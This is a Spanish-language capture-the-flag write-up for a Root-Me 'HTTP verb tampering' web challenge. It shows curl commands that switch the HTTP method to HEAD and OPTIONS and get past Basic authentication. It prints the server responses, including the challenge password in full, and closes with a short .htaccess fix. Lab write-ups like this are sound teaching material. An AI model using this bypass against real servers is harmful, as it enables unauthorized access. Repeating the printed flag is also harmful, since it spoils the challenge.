# [Nombre del Reto]

**CTF:** [http verbTampering]
**Categoría:** [Web]
**Dificultad:** [Fácil]
**Fecha:** [2025-12-30]

## 🎯 Descripción y Objetivo
se nos da una web con un login de usuario ejecutado por javascript y no incrustado en
html

## 🔍 Reconocimiento y Análisis
primero reviaamos la salida con curl

```bash

curl http://challenge01.root-me.org/web-serveur/ch8/ -i
HTTP/1.1 401 Unauthorized
Server: nginx
Date: Tue, 30 Dec 2025 14:12:32 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
WWW-Authenticate: Basic realm="My Realm"

<html xmlns="http://www.w3.org/1999/xhtml"><head>
<title>401 Authorization Required</title>
</head><body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
<h1>Authorization Required</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
<hr/>
<address>Apache Server at challenge01.root-me.org Port 80</address>

</body></html>~ $
```

teniendo eso en cuenta podemos probar a la modificacion de los verbos o metodos con curl
probando con HEAD

```bash
curl -X HEAD -i http://challenge01.root-me.org/web-serveur/ch8/
Warning: Setting custom HTTP method to HEAD with -X/--request may not work the way you want.
Warning: Consider using -I/--head instead.
HTTP/1.1 200 OK
Server: nginx
Date: Tue, 30 Dec 2025 14:14:17 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Vary: Accept-Encoding

```
el metodo de HEAD solo nos devuelve las cabezeras mas no el contenido,aun asi
podemos notar que la web nos da una salida 200 ok,esto significa que la web si es vulnerable
a la modificscion de verbos,haora podemos emepzar a fuzzear por diferemtes verbos con la
idea de que nos salte el contenido de la web

``` bash
curl -X OPTIONS -i http://challenge01.root-me.org/web-serveur/ch8/
HTTP/1.1 200 OK                                                                                      Server: nginx
Date: Tue, 30 Dec 2025 14:16:43 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Vary: Accept-Encoding


<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html><head>
</head>

<h1>Mot de passe / password : a23e$dme96d3saez$$prap
</h1>
</body></html>```

#conclusion

la web si es vulnerable a la modificacion de verbos http,esto se podria solucionar
aplicando esta configuracion en el .htacces de apache o similiares.


AuthType Basic
AuthName "Restricted Area"
AuthUserFile /path/to/.htpasswd
require valid-user
